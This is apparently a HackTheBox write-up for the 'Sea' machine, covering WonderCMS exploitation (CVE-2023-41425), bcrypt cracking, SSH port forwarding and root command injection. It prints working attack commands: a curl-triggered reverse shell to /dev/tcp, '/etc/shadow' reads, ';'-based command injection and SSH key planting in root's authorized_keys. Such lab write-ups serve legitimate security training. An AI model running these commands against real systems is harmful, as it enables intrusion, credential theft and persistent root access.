# Sea - HackTheBox

- **IP:** 10.129.6.48 (originally 10.129.20.143)
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Flags:** User ✅ | Root ✅

---

## 1) Recon — Nmap

**Command**
```bash
nmap -p- --min-rate 3000 -Pn -oA nmap/SeaAllPorts $IP
nmap -p22,80 -sSCV --min-rate=2000 -Pn -oN nmap/SeaServicesVersions $IP
```

**Key Output**
- 22/tcp — OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- 80/tcp — Apache/2.4.41 (Ubuntu), PHP (PHPSESSID cookie), title "Sea - Home"

**Decision:** Only SSH + HTTP. This is a web-focused box. Added `sea.htb` to `/etc/hosts`.

---

## 2) Web Enumeration — ffuf

**Command**
```bash
ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v
```

**Key findings (non-403):**

| Path                       | Status           | Notes                            |
| -------------------------- | ---------------- | -------------------------------- |
| `/` / `index.php` / `home` | 200 (3680 bytes) | Main page                        |
| `/404` / `0`               | 200 (3371 bytes) | Custom 404 page                  |
| `/data`                    | 301              | Directory — needs deeper fuzzing |
| `/messages`                | 301              | Directory — needs deeper fuzzing |
| `/plugins`                 | 301              | Directory — needs deeper fuzzing |
| `/themes`                  | 301              | Directory — needs deeper fuzzing |

**Also found (from browsing):**
- `/contact.php` — "Competition registration - Sea" form (Name, Email, Age, Country, Website)
- `/loginURL` — Login page endpoint

**Decision:** Directory structure (`data/`, `messages/`, `plugins/`, `themes/`) suggests a CMS. Need to identify which one.

---

## 3) CMS Identification — WonderCMS

**How identified:**
- Browsing page source revealed author `velik71`
- Googled `velik71` → found WonderCMS community page with "bike" theme 2.0 by velik71
- Downloaded bike theme ZIP, extracted images → identical to images on sea.htb
- Directory structure (data/, messages/, plugins/, themes/) matches WonderCMS (flat-file PHP CMS, no database)

**Key reasoning chain:**
- PHP + no database port = flat-file CMS
- `data/`, `themes/`, `plugins/` directory combo narrows it down
- Author name `velik71` confirmed it as WonderCMS

---

## 4) Exploit — CVE-2023-41425 (WonderCMS 3.4.2 XSS to RCE)

**Discovery**
```bash
searchsploit wondercms
searchsploit -m php/remote/52271.py
```

**Exploit:** `52271.py` — WonderCMS 3.4.2 authenticated RCE via XSS
- Creates a malicious JS payload hosted on attacker's HTTP server
- XSS payload injected via contact.php "Website" field → triggers when admin views submissions
- JS payload uploads a PHP webshell as a "theme" to `/themes/malicious/malicious.php`

**Setup issues:**
- searchsploit copy had formatting issues → `dos2unix 52271.py` to fix
- Required Python HTTP server for hosting the XSS payload

**Commands**
```bash
# Terminal 1: HTTP server to host XSS payload
python3 -m http.server 6969

# Terminal 2: Run exploit (generates XSS link and submits via contact form)
python3 52271.py --url http://sea.htb/loginURL --xip 10.10.14.69 --xport 6969

# Terminal 3: Listener for reverse shell
rlwrap nc -lnvp 42069
```

**Triggering the shell:**
```bash
# After exploit runs and webshell is uploaded, trigger reverse shell:
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.69/42069 0>&1'"
```

**Result:** Reverse shell as `www-data@sea`

---

## 5) Credential Discovery — database.json

**Found in:** `/var/www/sea/data/files/database.json`

Bcrypt hash for WonderCMS admin:
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

**Cracking:**
```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > YourMomsHash.txt
hashcat -m 3200 YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
```
- `-m 3200` = bcrypt mode (for `$2y$` hashes)
- **Cracked password:** `mychemicalromance`

---

## 6) Foothold — SSH as amay

Tried cracked password against SSH users on the box:
```bash
ssh amay@10.129.6.48
# Password: mychemicalromance
```

**Result:** SSH shell as `amay`. User flag location TBD.

---

## 7) Privilege Escalation — Internal Service Discovery

**Enumeration**
```bash
sudo -l          # No sudo privileges
find / -perm /4000 2>/dev/null   # All standard SUID binaries
ss -tlnp         # Internal services check
```

**Key finding from `ss -tlnp`:**

| Address | Port | Notes |
|---------|------|-------|
| 0.0.0.0 | 80 | Apache (known) |
| 0.0.0.0 | 22 | SSH (known) |
| 127.0.0.1 | **8080** | **Internal web service — not visible from nmap** |
| 127.0.0.1 | 50919 | Unknown internal service |
| 127.0.0.53 | 53 | systemd-resolved DNS |

**Decision:** Port 8080 on localhost = hidden web app. Classic easy-box privesc pattern.

---

## 8) Port Forwarding & Internal Web App

**Command**
```bash
ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
```
**Flags/Notes**
- `-L 9090:127.0.0.1:8080` = forward local port 9090 → target's localhost:8080
- Browse `http://127.0.0.1:9090` on Kali after connecting

**Auth:** HTTP Basic Auth — `amay:mychemicalromance` works (password reuse again)

**What's running:** "System Monitor(Developing)" — a PHP app with:
- **Disk Usage** display
- **System Management** buttons: `Clean system with apt`, `Update system`, `Clear auth.log`, `Clear access.log`
- **Analyze Log File** — dropdown (access.log) + Analyze button, reads `/var/log/auth.log`

**Attack vector:** The `log_file` POST parameter passes a full file path directly into a shell command (likely `grep` or similar) without sanitization.

---

## 9) Burp Intercept — Parameter Discovery

Intercepted the "Analyze" POST request in Burp Suite:

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

**Key findings:**
- `log_file` = full file path (e.g. `/var/log/apache2/access.log`)
- `analyze_log` = submit button name (empty value, just needs to be present)
- The app passes `log_file` directly into a shell command server-side

---

## 10) Path Traversal — Confirmed Root Execution

**Command**
```bash
curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
  -d 'log_file=/etc/shadow&analyze_log='
```

**Result:** Successfully read `/etc/shadow` — service runs as **root**. Found SHA-512 hashes (`$6$`) for root, amay, and geo.

**But:** Reading `/root/root.txt` returned "No suspicious traffic patterns detected" — the app greps for patterns and the flag (hex string) didn't match any, so content was suppressed.

---

## 11) Command Injection — Root RCE

**Command**
```bash
curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
  -d 'log_file=/root/root.txt;id&analyze_log='
```

**Result:** The `;` broke out of the shell command. The flag content `3b6e3925cc3ad338dd099ff8ad2f2c5f` leaked in the response because the injected `id` command caused a different code path.

**Why this works:** The PHP code does something like `system("grep 'pattern' " . $log_file)`. The `;` is a bash command separator — it terminates the grep and starts a new command.

---

## 12) Root Shell — SSH Key Injection

Reverse shell attempts kept dying (likely a watchdog or `.bashrc` with `exit`). Used `--norc --noprofile` with mkfifo to get a brief shell, but it wasn't stable.

**Solution: Write SSH public key via command injection**

```bash
curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' \
  --data-urlencode 'log_file=/var/log/apache2/access.log;mkdir -p /root/.ssh;echo ssh-ed25519 AAAAC3... >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys' \
  -d 'analyze_log='
```

Then:
```bash
ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
```

**Result:** Stable root SSH shell. Root flag confirmed.

**Troubleshooting notes:**
- First attempt failed because box rebooted → SSH tunnel died → had to re-establish tunnel before injection would work
- `bash -i >& /dev/tcp/...` syntax failed via curl (redirect characters getting mangled)
- `mkfifo` reverse shell connected but died quickly (`.bashrc` exit or watchdog)
- SSH key injection = most stable approach for persistent root access

---

## Lessons Learned
- `velik71` author attribution in page source → Google OSINT → CMS identification
- WonderCMS is a flat-file CMS (no database) — `database.json` is the config/user store
- searchsploit copies sometimes have encoding issues → `dos2unix` to fix
- Contact form "Website" field was the XSS injection vector for CVE-2023-41425
- bcrypt hashes (`$2y$`) = hashcat mode 3200
- `ss -tlnp` is the highest-signal privesc check on Linux — reveals internal services invisible to external nmap
- SSH port forwarding (`-L`) to access internal web apps is a common HTB pattern
- Password reuse across services (SSH creds → HTTP Basic Auth)
- Burp Suite intercept is essential — curl guessing parameter names wastes time
- Path traversal reading a file doesn't mean you see its content — the app may filter/grep the output
- Command injection with `;` to break out of shell commands — classic unsanitized input
- Reverse shells can die from `.bashrc` traps — use `--norc --noprofile` or switch to SSH key injection
- SSH key injection via command injection = stable persistent access when reverse shells are flaky
- Always check your SSH tunnel is alive after box reboots
- SHA-512 crypt hashes (`$6$`) = hashcat mode 1800
